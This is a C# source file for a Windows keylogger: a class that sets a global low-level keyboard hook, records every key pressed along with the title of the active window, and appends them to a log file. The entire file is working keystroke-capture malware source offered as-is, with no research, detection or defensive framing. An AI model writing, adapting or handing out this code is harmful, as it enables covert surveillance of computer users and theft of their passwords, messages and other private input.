using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Hooks
{
    class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private HookProc callback = null;
        private static IntPtr _hookID = IntPtr.Zero;
        private static String log = "";

        ///<summary>
        ///Initialize the keylogger.
        ///</summary>
        public KeyLogger(String logloc)
        {
            log = logloc;
            callback = new HookProc(HookCallback);

            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, this.callback,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        ///<summary>
        ///Disconnect the hook.
        ///</summary>
        public void Deactivate()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        ///<summary>
        ///Get the active window name.
        ///</summary>
        private static string GetActiveWindowName()
        {
            const int numChars = 256;
            StringBuilder buffer = new StringBuilder(numChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buffer, numChars) > 0)
            {
                return buffer.ToString();
            }
            return null;
        }

        ///<summary>
        ///Connect the hook to the process.
        ///</summary>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(log, true);
                sw.Write((Keys)vkCode);
                using (Process curProcess = Process.GetCurrentProcess())
                sw.Write(" - Process Name: "+(GetActiveWindowName()));
                sw.WriteLine();
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    }
}
